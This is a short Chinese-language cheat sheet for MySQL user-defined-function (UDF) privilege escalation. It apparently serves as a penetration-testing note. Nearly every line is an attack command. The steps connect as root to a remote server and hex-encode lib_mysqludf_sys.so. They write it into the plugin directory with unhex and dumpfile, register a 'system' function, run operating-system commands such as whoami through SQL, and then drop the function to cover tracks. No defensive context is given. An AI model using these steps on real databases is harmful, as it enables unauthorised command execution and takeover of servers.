1.首先连接数据库:
mysql -h rhost -uroot -p:
2.查找udf位置:
show variables like "%plugin%";
3.解密成hex网上下载的用户自定义函数:
Downloadurl: https://github.com/mysqludf/lib_mysqludf_sys.git
mysql> select hex(load_file('lib_mysqludf_sys.so')) into outfile '/tmp/udf.txt';
4.在远程Mysql上加载HEX编码的udf:
select unhex('HEX..') into dumpfile 'dir/mysqludf.so';
5.在本地计算机上用nm查看当前udf支持什么函数(kali下):
show function this udf fun:
nm -D mysqludf.so
6.在远程计算机上加载自定义函数:
create function system returns string soname "udftest.so";
7.在远程计算机上执行命令exec:
select system('whoami');
8.查找远程计算机上的mysql自定义函数:
select * from mysql.func;
9.删除远程计算机的mysql自定义函数:
drop function function_name；
